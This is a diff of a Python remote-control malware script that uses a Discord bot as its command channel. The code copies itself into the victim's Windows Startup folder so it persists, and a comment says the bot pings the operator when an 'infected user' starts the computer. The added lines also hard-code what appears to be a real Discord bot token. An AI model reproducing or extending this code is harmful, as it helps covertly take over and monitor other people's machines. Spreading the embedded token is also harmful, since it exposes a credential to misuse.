@@ -14,10 +14,15 @@ from discord.utils import get
 
 global Ping_On_Startup
 global Token
-Token = ""
+global GuildId
+GuildId = "Guild Id here"
+Token = "MTAxNDcwNzQ3Njg5NTExNzM3NA.GgGMxH.C9ZWw9wpoNlGFMSucpn2uyPDqEq6wN6TrQgG9E"
 # Bot Token Here Obviously
+# Bot needs all intents
 Ping_On_Startup = True
 # if the bot should ping you when an infected user starts his Computer
+
+
 path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/control.pyw" % getenv("userprofile")
 if not exists(path):
 	copy(__file__, path)
@@ -30,8 +35,8 @@ class Control(discord.Client):
 		self.tree = app_commands.CommandTree(self)
 
 	async def setup_hook(self):
-		self.tree.copy_global_to(guild=discord.Object(id=984582818489331732))
-		await self.tree.sync(guild=discord.Object(id=984582818489331732))
+		self.tree.copy_global_to(guild=discord.Object(id=GuildId))
+		await self.tree.sync(guild=discord.Object(id=GuildId))
 
 
 bot = Control()
